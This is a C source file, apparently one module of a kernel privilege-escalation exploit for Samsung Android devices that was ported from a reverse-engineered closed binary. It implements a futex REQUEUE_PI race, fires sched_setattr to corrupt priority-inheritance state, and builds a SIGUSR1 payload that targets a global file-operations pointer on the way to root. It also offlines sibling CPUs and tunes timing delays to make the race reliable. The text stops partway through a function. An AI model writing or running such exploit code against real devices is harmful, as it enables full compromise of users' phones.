/* source: FUN_00103e18 (waiter) + FUN_00104274 (owner) + FUN_00104300
 * (consumer). Real futex() sequence confirmed THREE ways this session:
 *   1. Raw r2 disassembly of the closed .so (see chat -- every uaddr,
 *      op, and arg register traced by hand):
 *        waiter: futex(&f_pi_chain, FUTEX_LOCK_PI)
 *                futex(&f_wait, FUTEX_WAIT_REQUEUE_PI, 0, &timeout,
 *                      &f_pi_target, 0)
 *                [on ETIMEDOUT] futex(&f_pi_chain, FUTEX_UNLOCK_PI)
 *        owner:  futex(&f_pi_target, FUTEX_LOCK_PI)
 *                futex(&f_pi_chain, FUTEX_LOCK_PI)
 *        consumer: syscall(0x112 [__NR_sched_setattr], waiter_tid, &attr, 0)
 *   2. Ghidra decompile of the same three functions.
 *   3. This project's own src/slide_app.c:slide_waiter_thread /
 *      slide_owner_thread already implement this exact sequence, and it
 *      has reached the expected "wait_requeue_pi ret=-1 errno=110"
 *      cleanly in every single test run this session -- the futex setup
 *      itself has never once been the crash site. Reused here (like
 *      kernelsnitch.h and groom.c's grooming choreography) rather than
 *      re-derived, because it is proven correct.
 *
 * source order, confirmed against FUN_001044f4: the closed binary calls
 * FUN_00106288 (groom_and_install_fops_object) to COMPLETION before ever
 * spawning these threads. Same order used here. */
#define _GNU_SOURCE
#include <errno.h>
#include <pthread.h>
#include <sched.h>
#include <signal.h>
#include <stddef.h>
#include <stdatomic.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/syscall.h>
#include <time.h>
#include <unistd.h>

#include "futex_trigger.h"
#include "pipe_physrw.h"
#include "sigusr1_payload.h"
#include "dentry_fops_preflight.h"

#define FUTEX_LOCK_PI 6
#define FUTEX_UNLOCK_PI 7
#define FUTEX_WAIT_REQUEUE_PI 11

/* Debug instrumentation (H0): split the v14 futex handshake wall time.
 * stderr only; no behavior change. g_futex_dbg_t0 is set at handshake entry
 * before any thread is created, so worker threads observe it too. */
static uint64_t g_futex_dbg_t0;
static uint64_t g_futex_dbg_last;

static uint64_t futex_now_ms(void) {
  struct timespec ts;
  clock_gettime(CLOCK_MONOTONIC, &ts);
  return (uint64_t)ts.tv_sec * 1000u + (uint64_t)ts.tv_nsec / 1000000u;
}

void futex_v14_dbg(const char *name) {
  uint64_t n = futex_now_ms();
  fprintf(stderr, "[futex-v14] dbg phase=%s t=+%llums dt=%llums\n", name,
          (unsigned long long)(n - g_futex_dbg_t0),
          (unsigned long long)(n - g_futex_dbg_last));
  g_futex_dbg_last = n;
}

static long futex_op(uint32_t *uaddr, int op, uint32_t val,
                      const struct timespec *timeout, uint32_t *uaddr2,
                      uint32_t val3) {
  return syscall(SYS_futex, uaddr, op, val, timeout, uaddr2, val3);
}

/* source: FUN_001056a8 -- syscall(0x112 [__NR_sched_setattr], tid,
 * &attr, 0). attr zeroed except size, matching the closed binary's own
 * local_58 = DAT_001022c0 (a fixed small constant read out of its
 * .rodata -- its value only matters as struct sched_attr.size, which
 * userspace sets to sizeof(attr) by convention; using sizeof(local
 * struct) here is equivalent, not a guess). */
struct local_sched_attr {
  uint32_t size;
  uint32_t sched_policy;
  uint64_t sched_flags;
  int32_t sched_nice;
  uint32_t sched_priority;
  uint64_t sched_runtime;
  uint64_t sched_deadline;
  uint64_t sched_period;
};

/* Closed image state block: DAT_0010d730..DAT_0010d774.  Keeping the
 * object page-aligned preserves every address' low 12 bits.  The v14
 * path uses only this block; older diagnostic variants retain their
 * independent globals below. */
struct v14_state_page {
  unsigned char pad[0x730];
  atomic_int waiter_tid;       /* +0x730 */
  atomic_int route_done;       /* +0x734 */
  uint32_t pi_chain;           /* +0x738 */
  atomic_int waiter_ready;     /* +0x73c */
  atomic_int owner_started;    /* +0x740 */
  atomic_int waiter_waiting;   /* +0x744 */
  uint32_t wait;               /* +0x748 */
  uint32_t pi_target;          /* +0x74c */
  atomic_int sched_done;       /* +0x750 */
  atomic_int gate;             /* +0x754 */
  atomic_int owner_acquired;   /* +0x758 */
  atomic_int attempt_count;    /* +0x75c */
  atomic_int success_count;    /* +0x760 */
  atomic_int stop;             /* +0x764 */
  atomic_int delay_us;         /* +0x768 */
  atomic_int state;            /* +0x76c */
  atomic_int secondary_0;      /* +0x770 */
  atomic_int secondary_1;      /* +0x774 */
};

#define V14_OFFSET_ASSERT(field, expected)                                  \
  _Static_assert(offsetof(struct v14_state_page, field) == (expected),      \
                 "v14 state offset mismatch: " #field)
V14_OFFSET_ASSERT(waiter_tid, 0x730);
V14_OFFSET_ASSERT(route_done, 0x734);
V14_OFFSET_ASSERT(pi_chain, 0x738);
V14_OFFSET_ASSERT(waiter_ready, 0x73c);
V14_OFFSET_ASSERT(owner_started, 0x740);
V14_OFFSET_ASSERT(waiter_waiting, 0x744);
V14_OFFSET_ASSERT(wait, 0x748);
V14_OFFSET_ASSERT(pi_target, 0x74c);
V14_OFFSET_ASSERT(sched_done, 0x750);
V14_OFFSET_ASSERT(gate, 0x754);
V14_OFFSET_ASSERT(owner_acquired, 0x758);
V14_OFFSET_ASSERT(attempt_count, 0x75c);
V14_OFFSET_ASSERT(success_count, 0x760);
V14_OFFSET_ASSERT(stop, 0x764);
V14_OFFSET_ASSERT(delay_us, 0x768);
V14_OFFSET_ASSERT(state, 0x76c);
V14_OFFSET_ASSERT(secondary_0, 0x770);
V14_OFFSET_ASSERT(secondary_1, 0x774);
#undef V14_OFFSET_ASSERT

static struct v14_state_page g_v14_state __attribute__((aligned(4096)));
static uint64_t g_v14_delay_cycles;
static int g_v14_neutral_settle;
static uint64_t g_v14_ghost_task;
static uint64_t g_v14_initial_lock;
/* Diagnostics are kept outside v14_state_page so its closed-image offsets
 * remain byte-for-byte unchanged.  They are printed only after route_done,
 * outside the sigreturn/sched_setattr timing window. */
static atomic_int g_v14_sig_ok;
static atomic_long g_v14_last_sched_ret;
static atomic_int g_v14_last_sched_errno;
static atomic_int g_v14_consumer_policy;

static void v14_release_handler(int signo) { (void)signo; }

/* source: FUN_00104300 (raw disasm, confirmed clean/reliable, no BOLT
 * damage), right before its call to FUN_001056a8 (sched_setattr_tid).
 * Reads `getenv("S23_SUPERVISOR_ATTEMPT")` to index an 8-entry delay
 * table, then busy-waits that many RAW CPU CYCLES (`mrs cntvct_el0`,
 * not milliseconds) via a tight yield-loop before firing.
 *
 * CORRECTED THIS SESSION: earlier ported this using this project's own
 * src/main.c 8-entry table (`{5000, 0, 10000, 30000, -5000, 20000,
 * 15000, 25000}`, real `.rodata` offset 0x243c, 4-byte int32 entries),
 * assuming it was the SAME table reused for a second purpose here. It
 * is not -- re-verified with `r2 -qc "s 0x2240; px 64"` (raw bytes,
 * bypassing any address-translation mistake) and found a DIFFERENT
 * table at raw vaddr 0x2240, 8-byte int64 entries (confirmed by the
 * `uxtw 3` = `*8` index scaling in the disasm, vs `*4` for main.c's
 * table): `{0, 0x10, 0x20, 0x30, 0x40, 0x60, 0x80, 0x18}` = `{0, 16,
 * 32, 48, 64, 96, 128, 24}`. The earlier value used here (5000) was
 * simply wrong -- not close to any real table entry -- which is a
 * likely reason the one on-device test of "CPU pin + this delay"
 * showed no change: it wasn't testing a value the closed binary ever
 * actually uses. Real DEFAULT (env var unset or empty) is index 0 =
 * **0 cycles**, i.e. no delay at all in the common case; env var
 * indexing confirmed via raw disasm (`getenv` -> `atoi` ->
 * `idx_1based = atoi_result > 1 ? atoi_result : 1` -> `table[(idx_1based
 * - 1) & 7]`, raw vaddr 0x4408-0x4438). */
static uint64_t read_cntvct(void) {
  uint64_t val;
  __asm__ volatile("mrs %0, cntvct_el0" : "=r"(val));
  return val;
}

static void spin_wait_cycles(uint64_t cycles) {
  if (cycles == 0) {
    return;
  }
  uint64_t start = read_cntvct();
  while (read_cntvct() - start < cycles) {
    __asm__ volatile("yield" ::: "memory");
  }
}

static uint64_t supervisor_attempt_delay_cycles(void) {
  static const uint64_t kDelayTable[8] = {0, 16, 32, 48, 64, 96, 128, 24};
  const char *env = getenv("S23_SUPERVISOR_ATTEMPT");
  int idx_1based = 1;
  if (env != NULL && env[0] != '\0') {
    int v = atoi(env);
    idx_1based = (v > 1) ? v : 1;
  }
  int idx = (idx_1based - 1) & 7;
  return kDelayTable[idx];
}

static long sched_setattr_tid(int tid, int nice_value) {
  struct local_sched_attr attr;
  memset(&attr, 0, sizeof(attr));
  attr.size = sizeof(attr);
  attr.sched_nice = nice_value;
  return syscall(0x112, tid, &attr, 0);
}

/* source: raw vaddr 0x22c0 (.rodata), fresh re-disasm this session,
 * `e asm.sub.var=false`. Bytes `30 00 00 00 03 00 00 00` loaded as one
 * 8-byte `ldr d1,[x10,0x2c0]` covering struct sched_attr's first two
 * u32 fields together: size=0x30(48), sched_policy=3 (SCHED_BATCH).
 * Every earlier variant in this project left sched_policy at 0
 * (SCHED_OTHER) via memset -- never verified against the real binary
 * until now. A policy change takes a different __sched_setscheduler()
 * path than a same-policy renice, so this may be load-bearing. */
static long sched_setattr_tid_v4(int tid, int nice_value) {
  struct local_sched_attr attr;
  memset(&attr, 0, sizeof(attr));
  attr.size = sizeof(attr);
  attr.sched_policy = 3; /* SCHED_BATCH */
  attr.sched_nice = nice_value;
  return syscall(0x112, tid, &attr, 0);
}

static uint32_t f_wait;
static uint32_t f_pi_target;
static uint32_t f_pi_chain;
static atomic_int waiter_ready;
static atomic_int waiter_waiting;
static atomic_int owner_started;
static atomic_int owner_acquired;
static atomic_int deadlock_seen;
static atomic_int waiter_ok;
static atomic_int route_done;
static atomic_int waiter_tid_g;
/* Item 3: owner thread's tid. The owner holds f_pi_target, so its task_struct
 * is the pi-boost target the scheduler walks after the corruption -- i.e. the
 * victim whose pi_waiters the pi-repair must clear. Surfaced so an operator can
 * resolve its task_struct address and pass it via OSS_PI_REPAIR_VICTIM. */
static atomic_int owner_tid_g;

/* source: FUN_00103e18's sigaction+tgkill+FPSIMD-rewrite sequence, see
 * sigusr1_payload.h for the full derivation. Disabled by default
 * (`run_futex_trigger`/`run_futex_trigger_cb` behave exactly as
 * before, unaffected) -- only `run_futex_trigger_full()` enables this,
 * since it needs real page_base/ashmem_misc_fops_addr values to build
 * a meaningful payload, which the simpler entry points don't take. */
static atomic_int g_use_sigusr1;
static uint64_t g_sigusr1_page_base;
static uint64_t g_sigusr1_ashmem_target;

/* source: raw vaddr 0x3efc-0x3f24 (waiter, fcn.00003e18), fresh
 * re-disassembly this session, `e asm.sub.var=false`. CORRECTED a
 * long-standing bug: this project previously assumed a 50ms
 * `tv_nsec`-delta timeout (`src/slide_app.c`'s `SLIDE_WAIT_NSEC`,
 * carried over without independently re-checking THIS function's own
 * real timeout construction). The real code is `ldr x8,[sp]` (reads
 * `ts.tv_sec`, NOT `ts.tv_nsec` -- `struct timespec` layout on this
 * ABI is `{tv_sec@0, tv_nsec@8}`, both 8 bytes), `add x8,x8,8`, `str
 * x8,[sp]` -- i.e. a flat `ts.tv_sec += 8` (8 REAL SECONDS), with
 * `tv_nsec` left completely unmodified from whatever `clock_gettime`
 * just wrote. A different mechanism, not just a different constant:
 * every earlier variant's 50ms timeout meant the waiter's own
 * `WAIT_REQUEUE_PI` phase-1 wait (on `f_wait`) very likely elapsed and
 * returned `ETIMEDOUT` on its own, BEFORE this project's ~100ms
 * pre-`CMP_REQUEUE_PI` delay (see `run_futex_trigger_v4_cb` and later)
 * even ran `CMP_REQUEUE_PI` at all -- meaning every prior "genuine
 * success" (`cmp_requeue_pi ret=0`) this session may have been trivial
 * (0 waiters left to wake/requeue by the time it ran), not evidence of
 * a real proxy-lock wait. Needs re-testing on-device with this fix. */
#define WAIT_SEC 8

/* v14 waiter FUTEX_WAIT_REQUEUE_PI timeout ceiling. Default WAIT_SEC; the
 * requeue returns EAGAIN by design, so the waiter blocks here until this
 * timeout, then proceeds via the SIGUSR1/sched_setattr path. Tunable via
 * FUTEX_WAIT_SEC (experiment) clamped to [1, WAIT_SEC]; resolved once at
 * handshake entry before any thread exists. */
static int g_futex_wait_sec = WAIT_SEC;

static int futex_env_int_clamped(const char *name, int fallback, int lo,
                                  int hi) {
  const char *raw = getenv(name);
  if (!raw || !*raw) return fallback;
  errno = 0;
  char *end = NULL;
  long v = strtol(raw, &end, 0);
  if (errno != 0 || end == raw || *end != '\0' || v < lo || v > hi) {
    return fallback;
  }
  return (int)v;
}

/* source: FUN_000041f0, confirmed via raw r2 disasm this session:
 * sched_setaffinity(0, 0x80, &(1<<cpu)). The closed binary's waiter
 * thread (FUN_00103e18) calls this with cpu=3 as its very first
 * action, before any futex call -- not previously ported. Cheap,
 * strictly a scheduling hint, safe to add regardless of whether it
 * turns out to matter for the actual race timing. */
static void pin_to_cpu(int cpu) {
  cpu_set_t set;
  CPU_ZERO(&set);
  CPU_SET(cpu, &set);
  sched_setaffinity(0, sizeof(set), &set);
}

/* Item 2: quiet sibling CPUs and boost the trigger thread across the
 * sched_setattr -> fops-restore window, so no other CPU's scheduler walks the
 * corrupted pi-chain/task before the payload neutralizes the global fops
 * pointer. begin() runs BEFORE sched_setattr (i.e. before the corruption
 * exists), so offlining a CPU migrates its tasks while their pi state is still
 * clean. The window closes with oss_cpu_quiet_end(), which the post-trigger
 * callback calls right after the fops restore -- re-onlining the siblings so
 * the root stage's kworkers have CPUs again. Offlining a CPU via sysfs needs
 * privilege; on failure we log and keep only the affinity+RT narrowing. */
/* CPU_QUIET_KEEP must stay online through the window: the waiter thread (which
 * runs the post-trigger callback) is pinned here, so offlining every other CPU
 * migrates the remaining threads onto it rather than stranding the callback.
 * We deliberately do NOT change the caller's scheduling policy/affinity here:
 * boosting the consumer to SCHED_FIFO on the same CPU as the waiter can starve
 * the waiter and hang the callback. Offlining the siblings is the global effect
 * that actually stops another core from walking the fake pi-chain. */
#define CPU_QUIET_KEEP 3
#define CPU_QUIET_MAX 16
static int g_cpu_offlined[CPU_QUIET_MAX];
static int g_cpu_quiet_active;

static int cpu_set_online(int cpu, int online) {
  char path[64];
  snprintf(path, sizeof(path), "/sys/devices/system/cpu/cpu%d/online", cpu);
  FILE *f = fopen(path, "w");
  if (!f) {
    return 0;
  }
  int ok = (fputc(online ? '1' : '0', f) != EOF);
  if (fclose(f) != 0) {
    ok = 0;
  }
  return ok;
}

void oss_cpu_quiet_begin(void) {
  /* Default OFF. On a user build the payload lacks CAP_SYS_ADMIN, so every
   * sysfs offline write fails (offlined=0) -- no protection -- while the failed
   * fopen()s add syscalls right before sched_setattr, perturbing the timing the
   * futex race depends on. Enable only where the offline can actually take
   * (rooted/debug context) via OSS_CPU_QUIET=1. Resolved once to keep the hot
   * path free of repeated getenv work. */
  static int enabled = -1;
  if (enabled < 0) {
    enabled = getenv("OSS_CPU_QUIET") ? 1 : 0;
  }
  if (!enabled) {
    return;
  }
  if (g_cpu_quiet_active) {
    return;
  }
  g_cpu_quiet_active = 1;
  memset(g_cpu_offlined, 0, sizeof(g_cpu_offlined));

  int offed = 0;
  for (int cpu = 0; cpu < CPU_QUIET_MAX; cpu++) {
    if (cpu == CPU_QUIET_KEEP) {
      continue;
    }
    if (cpu_set_online(cpu, 0)) {
      g_cpu_offlined[cpu] = 1;
      offed++;
    }
  }
  fprintf(stderr, "[cpu-quiet] begin keep=cpu%d offlined=%d\n", CPU_QUIET_KEEP,
          offed);
}

void oss_cpu_quiet_end(void) {
  if (!g_cpu_quiet_active) {
    return;
  }
  int backed = 0;
  for (int cpu = 0; cpu < CPU_QUIET_MAX; cpu++) {
    if (g_cpu_offlined[cpu] && cpu_set_online(cpu, 1)) {
      backed++;
    }
  }
  fprintf(stderr, "[cpu-quiet] end restored=%d\n", backed);
  g_cpu_quiet_active = 0;
}

static void *waiter_thread_fn(void *arg) {
  (void)arg;
  pin_to_cpu(3);
  int tid = (int)syscall(SYS_gettid);
  atomic_store(&waiter_tid_g, tid);

  if (futex_op(&f_pi_chain, FUTEX_LOCK_PI, 0, NULL, NULL, 0) != 0) {
    fprintf(stderr, "[futex] waiter lock chain errno=%d\n", errno);
    return NULL;
  }

  atomic_store(&waiter_ready, 1);
  while (!atomic_load(&owner_started)) {
    usleep(1000);
  }

  struct timespec timeout;
  clock_gettime(CLOCK_MONOTONIC, &timeout);
  timeout.tv_sec += WAIT_SEC;

  atomic_store(&waiter_waiting, 1);
  errno = 0;
  long wait_ret =
      futex_op(&f_wait, FUTEX_WAIT_REQUEUE_PI, 0, &timeout, &f_pi_target, 0);
  int wait_errno = errno;
  fprintf(stderr, "[futex] wait_requeue_pi ret=%ld errno=%d\n", wait_ret,
          wait_errno);
  if (wait_ret != -1 || wait_errno != ETIMEDOUT) {
    atomic_store(&route_done, 1);
    return NULL;
  }
  atomic_store(&waiter_ok, 1);

  /* source: raw vaddr 0x3fe4-0x40d4 (`e asm.varsub=false`, this
   * session): the closed binary's waiter thread builds the FPSIMD
   * payload and fires tgkill(self, SIGUSR1) RIGHT HERE -- immediately
   * after the ETIMEDOUT cleanup, before anything else (the
   * UNLOCK_PI/deadlock_seen dance below runs after, in program order,
   * same as this port). Only when the caller opted in via
   * run_futex_trigger_full() (this thread's own tid is what
   * sigusr1_fire_and_wait() self-targets, so it must run from inside
   * this exact thread, not the main/consumer thread). */
  if (atomic_load(&g_use_sigusr1)) {
    sigusr1_build_payload(g_sigusr1_page_base, g_sigusr1_ashmem_target);
    int sig_ok = sigusr1_fire_and_wait();
    fprintf(stderr, "[futex] sigusr1 fire_and_wait=%d\n", sig_ok);
  }

  while (!atomic_load(&deadlock_seen)) {
    __asm__ volatile("yield" ::: "memory");
  }
  if (futex_op(&f_pi_chain, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0) != 0) {
    fprintf(stderr, "[futex] waiter unlock chain errno=%d\n", errno);
    atomic_store(&route_done, 1);
    return NULL;
  }
  while (!atomic_load(&owner_acquired)) {
    __asm__ volatile("yield" ::: "memory");
  }

  atomic_store(&route_done, 1);
  for (;;) {
    sleep(1);
  }
}

static void *owner_thread_fn(void *arg) {
  (void)arg;
  int owner_tid = (int)syscall(SYS_gettid);
  atomic_store(&owner_tid_g, owner_tid);
  fprintf(stderr, "[futex] owner tid=%d (pi-repair victim candidate)\n",
          owner_tid);
  if (futex_op(&f_pi_target, FUTEX_LOCK_PI, 0, NULL, NULL, 0) != 0) {
    fprintf(stderr, "[futex] owner lock target errno=%d\n", errno);
    return NULL;
  }
  while (!atomic_load(&waiter_ready)) {
    usleep(1000);
  }
  atomic_store(&owner_started, 1);
  if (futex_op(&f_pi_chain, FUTEX_LOCK_PI, 0, NULL, NULL, 0) != 0) {
    fprintf(stderr, "[futex] owner lock chain errno=%d\n", errno);
    return NULL;
  }
  atomic_store(&owner_acquired, 1);
  for (;;) {
    sleep(1);
  }
}

int run_futex_trigger_cb(futex_post_trigger_cb post_trigger_cb, void *ctx) {
  f_wait = 0;
  f_pi_target = 0;
  f_pi_chain = 0;
  atomic_store(&waiter_ready, 0);
  atomic_store(&waiter_waiting, 0);
  atomic_store(&owner_started, 0);
  atomic_store(&owner_acquired, 0);
  atomic_store(&deadlock_seen, 0);
  atomic_store(&waiter_ok, 0);
  atomic_store(&route_done, 0);
  atomic_store(&waiter_tid_g, 0);

  pthread_t waiter, owner;
  if (pthread_create(&waiter, NULL, waiter_thread_fn, NULL) != 0) {
    return 0;
  }
  if (pthread_create(&owner, NULL, owner_thread_fn, NULL) != 0) {
    return 0;
  }

  while (!atomic_load(&waiter_waiting) || !atomic_load(&owner_started)) {
    usleep(1000);
  }

  /* source: FUN_00106fa4-adjacent CMP_REQUEUE_PI deadlock-detection loop
   * (this project's own src/slide_app.c:slide_child_leak_stext already
   * implements this exact step for the KASLR stage; same call here,
   * targeting f_wait/f_pi_target). Loops FUTEX_CMP_REQUEUE_PI until it
   * returns the expected EDEADLK, which is what makes the waiter's
   * WAIT_REQUEUE_PI actually time out instead of blocking forever. */
  long requeue_ret = 0;
  int requeue_errno = 0;
  int polls = 0;
  while (polls < 1000) {
    polls++;
    errno = 0;
    requeue_ret =
        futex_op(&f_wait, 12 /* FUTEX_CMP_REQUEUE_PI */, 1, (void *)1,
                 &f_pi_target, 0);
    requeue_errno = errno;
    if (requeue_ret != 0) {
      break;
    }
    usleep(1000);
  }
  fprintf(stderr, "[futex] cmp_requeue_pi ret=%ld errno=%d polls=%d\n",
          requeue_ret, requeue_errno, polls);
  if (requeue_ret != -1 || requeue_errno != EDEADLK) {
    return 0;
  }
  atomic_store(&deadlock_seen, 1);

  while (!atomic_load(&route_done)) {
    usleep(1000);
  }
  if (!atomic_load(&waiter_ok)) {
    fprintf(stderr, "[futex] waiter route not ok, aborting before trigger\n");
    return 0;
  }

  spin_wait_cycles(supervisor_attempt_delay_cycles());

  /* Item 2: close the window on all CPUs but the pinned one BEFORE the
   * corruption is created, so any task migration happens while pi state is
   * still clean. The post-trigger callback reopens it (oss_cpu_quiet_end)
   * right after the fops restore; the end() calls below are the safety net for
   * the failure/raw-trigger paths (idempotent). */
  oss_cpu_quiet_begin();

  int tid = atomic_load(&waiter_tid_g);
  fprintf(stderr, "[futex] firing sched_setattr tid=%d\n", tid);
  long ret = sched_setattr_tid(tid, 1);
  int saved_errno = errno;
  fprintf(stderr, "[futex] sched_setattr ret=%ld errno=%d\n", ret,
          saved_errno);
  if (ret != 0) {
    oss_cpu_quiet_end();
    return 0;
  }

  if (post_trigger_cb == NULL) {
    oss_cpu_quiet_end();
    return 1;
  }
  fprintf(stderr, "[futex] invoking post-trigger callback immediately\n");
  int cb_ret = post_trigger_cb(ctx);
  fprintf(stderr, "[futex] post-trigger callback returned %d\n", cb_ret);
  oss_cpu_quiet_end();
  return cb_ret;
}

int run_futex_trigger(void) { return run_futex_trigger_cb(NULL, NULL); }

/* source: real kernel source, NOT disassembly -- this session traced
 * kernel/futex/core.c's futex_requeue_pi_complete() (raw kernel source,
 * `docs/kernel-reference` extraction from the real Samsung archive):
 * on a deadlock-detected CMP_REQUEUE_PI (what the functions above
 * treat as the desired outcome, inherited from this project's own
 * proven-correct src/slide_app.c -- proven for THAT function's
 * different, non-corrupting purpose only), the per-waiter
 * `requeue_state` becomes Q_REQUEUE_PI_NONE, which later resolves to
 * Q_REQUEUE_PI_IGNORE when the waiter's own uaddr1 timeout fires --
 * and futex_wait_requeue_pi() ONLY calls rt_mutex_wait_proxy_lock()/
 * rt_mutex_cleanup_proxy_lock() in the Q_REQUEUE_PI_DONE case, never
 * IGNORE. Confirmed empirically via kprobes on remove_waiter(),
 * rt_mutex_cleanup_proxy_lock(), and rt_mutex_adjust_prio_chain(): none
 * of them ever fire for either thread in this project's dance, across
 * every test this session -- we are provably never reaching the code
 * path that would touch task->pi_blocked_on at all, deadlock-avoidance
 * "success" notwithstanding.
 *
 * The deadlock above is not inherent to REQUEUE_PI itself -- it's
 * created by THIS dance's specific choice to have the owner thread
 * ALSO contend for f_pi_chain (which the waiter holds) after already
 * holding f_pi_target (requeue_pi's target). Removing that circular
 * wait (owner holds f_pi_target only, forever) should let
 * futex_proxy_trylock_atomic() find f_pi_target genuinely
 * contended-but-not-deadlocked, queue the waiter for real PI blocking,
 * and reach Q_REQUEUE_PI_DONE -- the path this project's `sched_setattr`
 * trigger has actually needed all along. Not yet proven on-device;
 * this function exists specifically to test that with the same kprobe
 * methodology, without touching the already-relied-upon functions
 * above. */
static void *owner_thread_fn_hold_only(void *arg) {
  (void)arg;
  if (futex_op(&f_pi_target, FUTEX_LOCK_PI, 0, NULL, NULL, 0) != 0) {
    fprintf(stderr, "[futex-v2] owner lock target errno=%d\n", errno);
    return NULL;
  }
  atomic_store(&owner_started, 1);
  for (;;) {
    sleep(1);
  }
}

static void *waiter_thread_fn_no_deadlock(void *arg) {
  (void)arg;
  pin_to_cpu(3);
  int tid = (int)syscall(SYS_gettid);
  atomic_store(&waiter_tid_g, tid);

  atomic_store(&waiter_waiting, 1);
  struct timespec timeout;
  clock_gettime(CLOCK_MONOTONIC, &timeout);
  timeout.tv_sec += WAIT_SEC;

  errno = 0;
  long wait_ret =
      futex_op(&f_wait, FUTEX_WAIT_REQUEUE_PI, 0, &timeout, &f_pi_target, 0);
  int wait_errno = errno;
  fprintf(stderr, "[futex-v2] wait_requeue_pi ret=%ld errno=%d\n", wait_ret,
          wait_errno);
  atomic_store(&waiter_ok, (wait_ret == -1 && wait_errno == ETIMEDOUT) ? 1 : 0);

  if (atomic_load(&waiter_ok) && atomic_load(&g_use_sigusr1)) {
    sigusr1_build_payload(g_sigusr1_page_base, g_sigusr1_ashmem_target);
    int sig_ok = sigusr1_fire_and_wait();
    fprintf(stderr, "[futex-v2] sigusr1 fire_and_wait=%d\n", sig_ok);
  }

  atomic_store(&route_done, 1);
  for (;;) {
    sleep(1);
  }
}

int run_futex_trigger_success_cb(futex_post_trigger_cb post_trigger_cb,
                                  void *ctx) {
  f_wait = 0;
  f_pi_target = 0;
  f_pi_chain = 0;
  atomic_store(&waiter_waiting, 0);
  atomic_store(&owner_started, 0);
  atomic_store(&waiter_ok, 0);
  atomic_store(&route_done, 0);
  atomic_store(&waiter_tid_g, 0);

  pthread_t waiter, owner;
  if (pthread_create(&owner, NULL, owner_thread_fn_hold_only, NULL) != 0) {
    return 0;
  }
  while (!atomic_load(&owner_started)) {
    usleep(1000);
  }
  if (pthread_create(&waiter, NULL, waiter_thread_fn_no_deadlock, NULL) != 0) {
    return 0;
  }
  while (!atomic_load(&waiter_waiting)) {
    usleep(1000);
  }

  /* Expect a REAL success here (ret >= 0), not EDEADLK. */
  errno = 0;
  long requeue_ret =
      futex_op(&f_wait, 12 /* FUTEX_CMP_REQUEUE_PI */, 1, (void *)1,
               &f_pi_target, 0);
  int requeue_errno = errno;
  fprintf(stderr, "[futex-v2] cmp_requeue_pi ret=%ld errno=%d\n", requeue_ret,
          requeue_errno);
  if (requeue_ret < 0) {
    fprintf(stderr, "[futex-v2] requeue failed, aborting before trigger\n");
    return 0;
  }

  while (!atomic_load(&route_done)) {
    usleep(1000);
  }
  if (!atomic_load(&waiter_ok)) {
    fprintf(stderr, "[futex-v2] waiter route not ok, aborting before trigger\n");
    return 0;
  }

  spin_wait_cycles(supervisor_attempt_delay_cycles());

  int tid = atomic_load(&waiter_tid_g);
  fprintf(stderr, "[futex-v2] firing sched_setattr tid=%d\n", tid);
  long ret = sched_setattr_tid(tid, 1);
  int saved_errno = errno;
  fprintf(stderr, "[futex-v2] sched_setattr ret=%ld errno=%d\n", ret,
          saved_errno);
  if (ret != 0) {
    return 0;
  }

  if (post_trigger_cb == NULL) {
    return 1;
  }
  fprintf(stderr, "[futex-v2] invoking post-trigger callback immediately\n");
  int cb_ret = post_trigger_cb(ctx);
  fprintf(stderr, "[futex-v2] post-trigger callback returned %d\n", cb_ret);
  return cb_ret;
}

/* source: raw disasm of FUN_00104274 (owner, `e asm.varsub=false`,
 * this session): AFTER acquiring f_pi_target, waits for a ready flag,
 * THEN unconditionally attempts FUTEX_LOCK_PI on a SECOND address
 * (0xd738, same address the waiter's OWN first FUTEX_LOCK_PI targets
 * -- i.e. what this project calls f_pi_chain), with no error-check
 * branch after the call, meaning it always expects to eventually
 * acquire it. run_futex_trigger_success_cb() above deliberately drops
 * this second lock entirely, since attempting it AT THE SAME TIME as
 * the CMP_REQUEUE_PI call (this project's original, pre-fix design)
 * created a real, sustained AB-BA deadlock that made
 * FUTEX_CMP_REQUEUE_PI itself deadlock-detect and bail via
 * Q_REQUEUE_PI_NONE, before ever reaching a real PI-blocked state --
 * confirmed via kprobes. This variant restores the owner's second
 * lock attempt, matching the closed binary's real structure, but
 * ONLY AFTER the requeue has already genuinely succeeded (confirmed
 * via a new synchronization flag) -- i.e. the owner's collision with
 * the waiter's still-held f_pi_chain now happens once the waiter is
 * ALREADY for-real proxy-PI-blocked on f_pi_target (rt_mutex_wait_proxy_lock()
 * actually running), not before. This is a real, disassembly-grounded
 * hypothesis, not a guess: rt_mutex_adjust_prio_chain()'s own
 * deadlock-cycle-completion walk, triggered by the owner's second lock
 * attempt, would need to inspect/manipulate the ALREADY-PROXY-LOCKED
 * waiter's rt_mutex_waiter structure to detect the cycle -- exactly
 * the kind of code path a subtle CVE could live in, and one this
 * project has never yet exercised (kprobes on
 * rt_mutex_adjust_prio_chain never fired for our threads even in the
 * success_cb variant above, since nothing ever triggered a SECOND
 * deadlock check there). Not yet proven on-device. */
static atomic_int g_requeue_succeeded;

/* Same as waiter_thread_fn_no_deadlock, but ALSO holds f_pi_chain
 * (acquired first, before signaling waiter_waiting) -- matches the
 * closed binary's real waiter structure (LOCK_PI on this same address
 * as its very first futex call). Must be its own function, not a flag
 * on waiter_thread_fn_no_deadlock, so run_futex_trigger_success_cb()
 * (v2, already proven to reach the real code path) is completely
 * unaffected by this v3 experiment. */
static void *waiter_thread_fn_two_locks(void *arg) {
  (void)arg;
  pin_to_cpu(3);
  int tid = (int)syscall(SYS_gettid);
  atomic_store(&waiter_tid_g, tid);

  if (futex_op(&f_pi_chain, FUTEX_LOCK_PI, 0, NULL, NULL, 0) != 0) {
    fprintf(stderr, "[futex-v3] waiter lock chain errno=%d\n", errno);
    return NULL;
  }

  atomic_store(&waiter_waiting, 1);
  struct timespec timeout;
  clock_gettime(CLOCK_MONOTONIC, &timeout);
  timeout.tv_sec += WAIT_SEC;

  errno = 0;
  long wait_ret =
      futex_op(&f_wait, FUTEX_WAIT_REQUEUE_PI, 0, &timeout, &f_pi_target, 0);
  int wait_errno = errno;
  fprintf(stderr, "[futex-v3] wait_requeue_pi ret=%ld errno=%d\n", wait_ret,
          wait_errno);
  atomic_store(&waiter_ok, (wait_ret == -1 && wait_errno == ETIMEDOUT) ? 1 : 0);

  if (atomic_load(&waiter_ok) && atomic_load(&g_use_sigusr1)) {
    sigusr1_build_payload(g_sigusr1_page_base, g_sigusr1_ashmem_target);
    int sig_ok = sigusr1_fire_and_wait();
